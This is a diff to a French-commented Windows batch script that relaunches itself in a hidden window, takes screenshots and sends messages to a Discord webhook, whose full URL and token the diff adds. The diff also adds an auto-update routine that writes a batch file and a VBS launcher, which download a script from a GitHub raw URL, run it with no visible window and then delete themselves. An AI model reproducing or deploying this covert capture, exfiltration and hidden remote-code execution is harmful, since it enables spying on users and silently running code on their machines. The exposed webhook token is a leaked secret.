@@ -2,14 +2,27 @@
 if not "%1"=="hide" start /B cmd /c "%~0" hide & exit
 setlocal enabledelayedexpansion
 
+set debutchemin=C:\Users\Aubin\Downloads\
 
 :: 📌 Définition des variables
-set WEBHOOK_URL=https://teste
-set SCREENSHOT_PATH=%TEMP%\screenshot.png
+set WEBHOOK_URL=https://discord.com/api/webhooks/1334179975577862215/FQLGLyudyE8QhYH4OS9MoH-5970K2FU1Ug3tCZ0x7KdWJHHjVMXnSjzSsrOdL8yIGfEo
+set SCREENSHOT_PATH=%debutchemin%\screenshot.png
 
 set END_TIME=%TIME:~0,2%
 set /A END_TIME+=0
 set /A END_TIME+=1
+set USER=Auren009
+set REPO=lunettes-octo-flottantes
+
+:: Définir le chemin vers le future fichier batch et vbs
+set chemin=%debutchemin%paserelle.bat
+set chemin_vbs=%debutchemin%lancer_cacheeeeee.vbs
+set URL=https://raw.githubusercontent.com/Auren009/lunettes-octo-flottantes/main/WebHook.bat
+set DESTINATION=WebHook1.bat
+
+
+
+set version=2025-01-3-17
 
 
 set photo=true
@@ -23,14 +36,14 @@ set message=true
 
 
 
-if %message%==true (
+if %message%==false (
     curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"%MESSAGE1%\"}" %WEBHOOK_URL%
 )
 
 
 
 
-if %photo%==true (
+if %photo%==false (
     :: Si "photo" est égal à 1, prend une capture d'écran et l'envoie
     curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Lancement_des_capture\"}" %WEBHOOK_URL%
 
@@ -65,6 +78,85 @@ if %photo%==true (
 
 
 :END
+
+::Regarder la nouvelle version
+    :: Récupérer les commits du dépôt GitHub et chercher la première occurrence de "date"
+    curl -s https://api.github.com/repos/%USER%/%REPO%/commits | findstr /C:"date" > temp.txt
+
+    :: Lire la première ligne contenant "date" et extraire proprement la date et l'heure
+    for /f "tokens=2 delims=:," %%A in ('findstr /C:"date" temp.txt') do (
+        set RAW_DATE=%%A
+        goto :BREAK
+    )
+
+    :BREAK
+    :: Nettoyage du fichier temporaire
+    del temp.txt
+
+    :: Supprimer les caractères superflus (" et ,)
+    set RAW_DATE=%RAW_DATE:"=%
+    set RAW_DATE=%RAW_DATE:,=%
+
+    :: Supprimer la lettre "T" et extraire la date et l'heure
+    set RAW_DATE=%RAW_DATE:T= %
+    set DATE=%RAW_DATE:~0,10%
+    set TIME=%RAW_DATE:~11,5%
+
+    set RAW_DATE=%RAW_DATE: =%
+
+    set nouversion=%RAW_DATE%
+
+
+
+::
+
+
+
+curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Demarre\"}" %WEBHOOK_URL%
+
+
+
+
+
+if %nouversion% neq %version% (
+    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Il existe une nouvelle version\"}" %WEBHOOK_URL%
+    goto :debutversion
+)
+
+::Se programme (dans prog de base) créeer un programme puis le lance en caché et se suppr lui meme
+
+goto :finversion
+:debutversion
+
+:: Crée un nouveau fichier batch, paserelle, avec le chemin défini (Doit téléharger nouv version, puis la lancer et se suppr) Tout fait
+echo @echo off > "%chemin%"
+echo setlocal enabledelayedexpansion >> "%chemin%"
+echo set "URL=https://raw.githubusercontent.com/Auren009/lunettes-octo-flottantes/main/WebHook.bat" >> "%chemin%"
+echo set "DESTINATION=%debutchemin%WebHook1.bat" >> "%chemin%"
+echo curl -o "%DESTINATION%" "%URL%" > nul 2>&1 >> "%chemin%"
+echo cscript //nologo "%debutchemin%lancerWebHook1.vbs" >> "%chemin%"
+echo del "%chemin_vbs%" >> "%chemin%"
+echo del "%chemin%" >> "%chemin%"
+
+
+::Crée le fichier vbs
+echo Set WshShell = CreateObject("WScript.Shell") > "%chemin_vbs%"
+echo WshShell.Run "cmd /c ""%chemin%""", 0, False >> "%chemin_vbs%"
+
+
+
+::Lance le vbs
+cscript //nologo "%chemin_vbs%"
+
+del "%chemin_vbs%"
+
+:: Supprime le programme batch principal (se suppr)
+::del "%~f0"
+
+:finversion
+
+
+
 
 
 
